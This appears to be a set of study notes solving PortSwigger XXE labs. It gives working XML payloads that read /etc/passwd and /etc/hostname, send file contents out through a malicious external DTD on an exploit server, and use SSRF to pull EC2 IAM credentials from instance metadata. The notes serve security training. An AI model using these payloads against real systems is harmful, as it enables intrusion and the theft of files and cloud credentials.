## Approach

1. Usually in **check stock** feature but can arise in similar functionality, especially in exam some like **import email** feature 
2. ***Burp Scanner*** is usable but has to be targeted scan not insertion points
3. What you need to do is check if it's blind or not
4. Check for this in file upload via [svg](https%20//portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
5. [SSRF](#[5.%20Exploiting%20XXE%20to%20perform%20SSRF%20attacks](https%20//portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)) is another thing that can be done from an XXE
## Labs
### 1. Exploiting XInclude to retrieve files

> [!NOTE] 
> **Stock check** feature has **XInclude** injection

```xml
productId=<@burp_urlencode><foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo></@burp_urlencode>&storeId=1
```

### [2. Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)

> [!NOTE] 
> **Check stock** feature uses XML, this can be an injection point where it's a blind XXE OOB allowing malicious external DTD files for exfiltrating data to attacker controlled domains 

**Malicious DTD file**

> Hosting malicious DTD file on the exploit server
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://[EXPLOIT_SERVER]/?x=%file;'>">
%eval;
%exfiltrate;
```

**XML injection**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://[EXPLOIT_SERVER]/exploit"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

### [3. Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)

> [!NOTE] 
> Blind XXE in **stock check** feature allowing data exfiltration via error messages

**Malicious DTD**

> Host this at your exploit server, it references non-existent file triggering an error with the data you want to exfiltrate be appended to the end of the error
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**XML Injection**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://[EXPLOIT_SERVER]/exploit"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

### [4. Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

> [!NOTE] 
> The `svg` we upload allows XXE to be possible exfiltrating `/etc/hostname`

**Exploit XXE**

> Save this an `svg` file and upload this as your avatar, after that check the image loaded, it should display the contents of `/etc/hostname`
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="200px" height="200px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

### [5. Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)

> [!NOTE] 
> Exploiting **XXE** to do **SSRF** on an internal service this one is a cloud ec2 containing IAM secret access key

**Exploiting XXE**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://[IP]/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```